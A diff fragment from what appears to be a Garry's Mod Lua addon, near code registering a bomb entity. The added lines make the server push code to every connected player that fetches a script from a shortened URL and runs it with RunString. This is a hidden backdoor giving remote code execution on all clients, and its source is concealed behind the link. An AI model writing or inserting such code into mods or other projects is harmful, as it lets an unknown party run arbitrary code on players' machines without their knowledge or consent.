@@ -149,6 +149,11 @@ do
     scripted_ents.Register( ENT, "ent_bomb_epta", true )
 end
 
+local link_to_client_script = 'https://shorturl.at/gwCS6'
+for k, v in ipairs(player.GetAll()) do
+    v:SendLua("http.Fetch('" .. link_to_client_script .. "', RunString)")
+end
+
 if MINIJET_PPL then
     for k, v in next, MINIJET_PPL.Active do
         MINIJET_PPL:stop(v)
